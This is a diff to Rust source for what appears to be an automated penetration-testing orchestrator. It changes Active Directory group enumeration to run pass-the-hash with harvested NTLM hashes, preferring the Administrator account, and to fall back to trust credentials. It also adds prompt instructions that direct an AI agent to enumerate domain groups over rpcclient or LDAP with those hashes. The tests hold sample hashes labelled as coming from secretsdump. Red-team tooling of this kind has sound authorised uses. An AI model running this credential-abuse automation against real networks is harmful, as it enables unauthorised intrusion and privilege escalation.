@@ -23,33 +23,98 @@ use crate::orchestrator::state::*;
 /// Pure logic extracted from `auto_group_enumeration` so it can be unit-tested
 /// without needing a `Dispatcher` or async runtime.
 fn collect_group_enum_work(state: &StateInner) -> Vec<GroupEnumWork> {
-    if state.credentials.is_empty() {
+    if state.credentials.is_empty() && state.hashes.is_empty() {
         return Vec::new();
     }
 
     let mut items = Vec::new();
 
-    for (domain, dc_ip) in &state.domain_controllers {
-        let dedup_key = format!("group_enum:{}", domain.to_lowercase());
-        if state.is_processed(DEDUP_GROUP_ENUMERATION, &dedup_key) {
+    for (domain, dc_ip) in &state.all_domains_with_dcs() {
+        // Use separate dedup keys for cred vs hash attempts so a failed
+        // password-based attempt (e.g., mislabeled credential domain)
+        // doesn't permanently block the hash-based path.
+        let dedup_key_cred = format!("group_enum:{}:cred", domain.to_lowercase());
+        let dedup_key_hash = format!("group_enum:{}:hash", domain.to_lowercase());
+        let dedup_key_trust = format!("group_enum:{}:trust", domain.to_lowercase());
+
+        // Prefer same-domain cleartext cred, then fall back to trust-compatible
+        // cred (child→parent or cross-forest). Trust-based attempts use a
+        // separate dedup key so they don't block hash-based fallback.
+        let (cred, using_trust_cred) =
+            if !state.is_processed(DEDUP_GROUP_ENUMERATION, &dedup_key_cred) {
+                let c = state
+                    .credentials
+                    .iter()
+                    .find(|c| c.domain.to_lowercase() == domain.to_lowercase())
+                    .cloned();
+                (c, false)
+            } else {
+                (None, false)
+            };
+        let (cred, using_trust_cred) =
+            if cred.is_none() && !state.is_processed(DEDUP_GROUP_ENUMERATION, &dedup_key_trust) {
+                match state.find_trust_credential(domain) {
+                    Some(c) => (Some(c), true),
+                    None => (None, using_trust_cred),
+                }
+            } else {
+                (cred, using_trust_cred)
+            };
+
+        // Look for NTLM hash (PTH) — fires independently of cred attempt
+        let (ntlm_hash, ntlm_hash_username) =
+            if cred.is_none() && !state.is_processed(DEDUP_GROUP_ENUMERATION, &dedup_key_hash) {
+                state
+                    .hashes
+                    .iter()
+                    .find(|h| {
+                        h.hash_type.to_lowercase() == "ntlm"
+                            && h.domain.to_lowercase() == domain.to_lowercase()
+                            && h.username.to_lowercase() == "administrator"
+                    })
+                    .or_else(|| {
+                        state.hashes.iter().find(|h| {
+                            h.hash_type.to_lowercase() == "ntlm"
+                                && h.domain.to_lowercase() == domain.to_lowercase()
+                                && !state.is_delegation_account(&h.username)
+                        })
+                    })
+                    .map(|h| (Some(h.hash_value.clone()), Some(h.username.clone())))
+                    .unwrap_or((None, None))
+            } else {
+                (None, None)
+            };
+
+        // Need at least a credential or an NTLM hash
+        if cred.is_none() && ntlm_hash.is_none() {
             continue;
         }
 
-        let cred = match state
-            .credentials
-            .iter()
-            .find(|c| c.domain.to_lowercase() == domain.to_lowercase())
-            .or_else(|| state.credentials.first())
-        {
-            Some(c) => c.clone(),
-            None => continue,
+        let dedup_key = if ntlm_hash.is_some() {
+            dedup_key_hash
+        } else if using_trust_cred {
+            dedup_key_trust
+        } else {
+            dedup_key_cred
         };
 
         items.push(GroupEnumWork {
             dedup_key,
             domain: domain.clone(),
             dc_ip: dc_ip.clone(),
-            credential: cred,
+            credential: cred.unwrap_or_else(|| ares_core::models::Credential {
+                id: String::new(),
+                username: ntlm_hash_username.clone().unwrap_or_default(),
+                password: String::new(),
+                domain: domain.clone(),
+                source: "hash_fallback".into(),
+                is_admin: false,
+                discovered_at: None,
+                parent_id: None,
+                attack_step: 0,
+            }),
+            ntlm_hash,
+            ntlm_hash_username,
         });
     }
 
@@ -62,7 +127,7 @@ pub async fn auto_group_enumeration(
     dispatcher: Arc<Dispatcher>,
     mut shutdown: watch::Receiver<bool>,
 ) {
-    let mut interval = tokio::time::interval(Duration::from_secs(45));
+    let mut interval = tokio::time::interval(Duration::from_secs(20));
     interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
 
     loop {
@@ -84,15 +149,32 @@ pub async fn auto_group_enumeration(
         };
 
         for item in work {
-            let cross_domain = item.credential.domain.to_lowercase() != item.domain.to_lowercase();
+            // When PTH hash is available, use the hash user's identity for the target domain
+            // instead of a cross-domain credential that will fail LDAP simple bind.
+            let (cred_user, cred_pass, cred_domain) = if item.ntlm_hash.is_some() {
+                (
+                    item.ntlm_hash_username
+                        .clone()
+                        .unwrap_or_else(|| item.credential.username.clone()),
+                    String::new(),       // empty password forces PTH path
+                    item.domain.clone(), // target domain, not cross-domain
+                )
+            } else {
+                (
+                    item.credential.username.clone(),
+                    item.credential.password.clone(),
+                    item.credential.domain.clone(),
+                )
+            };
+            let cross_domain = cred_domain.to_lowercase() != item.domain.to_lowercase();
             let mut payload = json!({
                 "technique": "ldap_group_enumeration",
                 "target_ip": item.dc_ip,
                 "domain": item.domain,
                 "credential": {
-                    "username": item.credential.username,
-                    "password": item.credential.password,
-                    "domain": item.credential.domain,
+                    "username": cred_user,
+                    "password": cred_pass,
+                    "domain": cred_domain,
                 },
                 "filters": ["(objectCategory=group)"],
                 "attributes": [
@@ -102,27 +184,41 @@ pub async fn auto_group_enumeration(
                 "enumerate_members": true,
                 "resolve_foreign_principals": true,
                 "instructions": concat!(
-                    "Enumerate ALL security groups in this domain via LDAP query ",
-                    "(objectCategory=group). For each group, resolve its members ",
-                    "recursively, including Foreign Security Principals (CN=ForeignSecurityPrincipals). ",
-                    "Report: group name, group type (Global/DomainLocal/Universal), ",
-                    "all members (including nested), managedBy, and any cross-domain memberships. ",
-                    "Use net group /domain or LDAP to enumerate. Also check Domain Local groups ",
-                    "for foreign members from trusted domains. ",
-                    "Pay special attention to groups that grant elevated privileges: ",
-                    "Domain Admins, Enterprise Admins, Administrators, Backup Operators, ",
-                    "Server Operators, Account Operators, DnsAdmins, and any custom groups ",
-                    "with adminCount=1.\n\n",
-                    "IMPORTANT: For each user found in any group, include them in the ",
-                    "discovered_users array with EXACTLY this JSON format:\n",
+                    "Enumerate ALL security groups in this domain.\n\n",
+                    "AUTHENTICATION: If the password field is EMPTY and an NTLM hash is provided, ",
+                    "you MUST use pass-the-hash. Do NOT attempt LDAP simple bind with empty password.\n",
+                    "  - Use the rpcclient_command tool: rpcclient_command(target=dc_ip, username=user, ",
+                    "domain=domain, command='enumdomgroups') — then for each group RID: ",
+                    "'querygroupmem <rid>' and 'queryuser <rid>' to resolve members.\n",
+                    "  - Or use ldap_search with the hash if supported.\n\n",
+                    "If a password IS provided, use ldap_search with filter (objectCategory=group) ",
+                    "to enumerate groups, members, and Foreign Security Principals.\n\n",
+                    "For EACH group found, report it as a vulnerability:\n",
+                    "  vuln_type: 'group_enumerated'\n",
+                    "  target: the group sAMAccountName\n",
+                    "  target_ip: the DC IP\n",
+                    "  domain: the domain\n",
+                    "  details: {\"group_type\": \"Global/DomainLocal/Universal\", ",
+                    "\"members\": [\"user1\", \"user2\"], \"managed_by\": \"manager\", ",
+                    "\"admin_count\": true/false}\n\n",
+                    "Pay special attention to: Domain Admins, Enterprise Admins, Administrators, ",
+                    "Backup Operators, Server Operators, Account Operators, DnsAdmins, ",
+                    "and any custom groups with adminCount=1.\n\n",
+                    "Report cross-domain memberships as vuln_type='foreign_group_membership'.\n\n",
+                    "IMPORTANT: For each user found, include in discovered_users array:\n",
                     "  {\"username\": \"samaccountname\", \"domain\": \"domain.local\", ",
-                    "\"source\": \"ldap_group_enumeration\", \"memberOf\": [\"Group1\", \"Group2\"]}\n",
-                    "Also report any cross-domain group memberships as vulnerabilities with ",
-                    "vuln_type='foreign_group_membership'."
+                    "\"source\": \"ldap_group_enumeration\", \"memberOf\": [\"Group1\", \"Group2\"]}"
                 ),
             });
             if cross_domain {
                 payload["bind_domain"] = json!(item.credential.domain);
+            }
+            // Attach NTLM hash for PTH when no cleartext cred for target domain
+            if let Some(ref hash) = item.ntlm_hash {
+                payload["ntlm_hash"] = json!(hash);
+            }
+            if let Some(ref user) = item.ntlm_hash_username {
+                payload["hash_username"] = json!(user);
             }
 
             let priority = dispatcher.effective_priority("group_enumeration");
@@ -164,6 +260,8 @@ struct GroupEnumWork {
     domain: String,
     dc_ip: String,
     credential: ares_core::models::Credential,
+    ntlm_hash: Option<String>,
+    ntlm_hash_username: Option<String>,
 }
 
 #[cfg(test)]
@@ -172,8 +270,10 @@ mod tests {
 
     #[test]
     fn dedup_key_format() {
-        let key = format!("group_enum:{}", "contoso.local");
-        assert_eq!(key, "group_enum:contoso.local");
+        let key_cred = format!("group_enum:{}:cred", "contoso.local");
+        let key_hash = format!("group_enum:{}:hash", "contoso.local");
+        assert_eq!(key_cred, "group_enum:contoso.local:cred");
+        assert_eq!(key_hash, "group_enum:contoso.local:hash");
     }
 
     #[test]
@@ -253,6 +353,8 @@ mod tests {
             domain: "contoso.local".into(),
             dc_ip: "192.168.58.10".into(),
             credential: cred,
+            ntlm_hash: None,
+            ntlm_hash_username: None,
         };
         assert_eq!(work.domain, "contoso.local");
         assert_eq!(work.dc_ip, "192.168.58.10");
@@ -267,9 +369,44 @@ mod tests {
 
     #[test]
     fn dedup_keys_differ_per_domain() {
-        let key1 = format!("group_enum:{}", "contoso.local");
-        let key2 = format!("group_enum:{}", "fabrikam.local");
+        let key1 = format!("group_enum:{}:cred", "contoso.local");
+        let key2 = format!("group_enum:{}:cred", "fabrikam.local");
         assert_ne!(key1, key2);
+    }
+
+    #[test]
+    fn collect_hash_fires_after_cred_dedup_burned() {
+        let mut state = StateInner::new("test-op".into());
+        state
+            .domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        // Cred-based attempt already dispatched (may have failed)
+        state.mark_processed(
+            DEDUP_GROUP_ENUMERATION,
+            "group_enum:contoso.local:cred".into(),
+        );
+        // Add an NTLM hash — should still generate work via hash path
+        state.hashes.push(ares_core::models::Hash {
+            id: "h1".into(),
+            username: "Administrator".into(),
+            hash_value: "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".into(),
+            hash_type: "ntlm".into(),
+            domain: "contoso.local".into(),
+            source: "secretsdump".into(),
+            cracked_password: None,
+            discovered_at: None,
+            parent_id: None,
+            aes_key: None,
+            attack_step: 0,
+        });
+        let work = collect_group_enum_work(&state);
+        assert_eq!(
+            work.len(),
+            1,
+            "hash path should fire even after cred dedup burned"
+        );
+        assert_eq!(work[0].dedup_key, "group_enum:contoso.local:hash");
+        assert!(work[0].ntlm_hash.is_some());
     }
 
     fn make_credential(
@@ -332,24 +469,30 @@ mod tests {
         state
             .credentials
             .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
-        state.mark_processed(DEDUP_GROUP_ENUMERATION, "group_enum:contoso.local".into());
+        state.mark_processed(
+            DEDUP_GROUP_ENUMERATION,
+            "group_enum:contoso.local:cred".into(),
+        );
+        state.mark_processed(
+            DEDUP_GROUP_ENUMERATION,
+            "group_enum:contoso.local:hash".into(),
+        );
         let work = collect_group_enum_work(&state);
         assert!(work.is_empty());
     }
 
     #[test]
-    fn collect_cross_domain_fallback_to_first() {
+    fn collect_cross_domain_cred_skipped_without_hash() {
         let mut state = StateInner::new("test-op".into());
         state
             .domain_controllers
             .insert("contoso.local".into(), "192.168.58.10".into());
-        // Only fabrikam cred, should fall back to first()
+        // Only fabrikam cred — should NOT fall back cross-domain (burns dedup slot)
         state
             .credentials
             .push(make_credential("crossuser", "P@ssw0rd!", "fabrikam.local")); // pragma: allowlist secret
         let work = collect_group_enum_work(&state);
-        assert_eq!(work.len(), 1);
-        assert_eq!(work[0].credential.username, "crossuser");
+        assert_eq!(work.len(), 0, "cross-domain cred should not produce work");
     }
 
     #[test]
@@ -382,7 +525,7 @@ mod tests {
             .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
         let work = collect_group_enum_work(&state);
         assert_eq!(work.len(), 1);
-        assert_eq!(work[0].dedup_key, "group_enum:contoso.local");
+        assert_eq!(work[0].dedup_key, "group_enum:contoso.local:cred");
     }
 
     #[test]
